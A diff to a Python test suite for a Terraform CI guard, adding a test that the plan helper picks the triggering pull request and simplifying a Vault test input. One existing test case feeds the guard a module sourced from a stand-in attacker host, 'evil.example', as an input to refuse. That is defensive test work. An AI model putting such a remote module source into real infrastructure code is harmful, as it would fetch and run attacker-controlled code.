@@ -116,7 +116,7 @@ results = [
     check("tf file elsewhere does not refuse a homelab PR", guard2("payload/main.tf", "x = 1\n"), 0),
     check("unicode escape refused", guard('data "vault\\u005fkv_secret_v2" "x" {}\n'), 1),
     check("vault_path edit in a file that reads Vault refused",
-          guard('ephemeral "vault_kv_secret_v2" "p" {}\n' if False else 'data vault_x y {}\n  vault_path = "iac/minio"\n'), 1),
+          guard('data vault_x y {}\n  vault_path = "iac/minio"\n'), 1),
     check("comment cannot hide a token", guard("# no provisioner here\n"), 1),
     check("one-line module with remote source refused",
           guard('module "x" { source = "git::https://evil.example/x.git" }\n'), 1),
@@ -195,5 +195,23 @@ def gh_case():
     return calls[-1]
 
 
+def find_pr_case():
+    """With stacked PRs, only the PR named by the trigger, at this head, is planned."""
+    import importlib.util
+    spec = importlib.util.spec_from_file_location("g2", os.path.join(HERE, "tf-plan-gh.py"))
+    g = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(g)
+    g.api = lambda m, p, b=None: [
+        {"state": "open", "number": 9, "head": {"sha": "other"}, "base": {"ref": "main"}},
+        {"state": "open", "number": 7, "head": {"sha": "abc"}, "base": {"ref": "main"}}]
+    with tempfile.NamedTemporaryFile("w", delete=False) as f:
+        os.environ["GITHUB_OUTPUT"] = f.name
+    g.find_pr("abc", "7")
+    got = open(os.environ["GITHUB_OUTPUT"]).read()
+    os.unlink(os.environ["GITHUB_OUTPUT"])
+    return "number=7" in got and "skip=false" in got
+
+
+results.append(check("find-pr picks the triggering PR at this head", find_pr_case(), True))
 results.append(check("another user's marked comment is not edited", gh_case(), "POST"))
 sys.exit(0 if all(results) else 1)
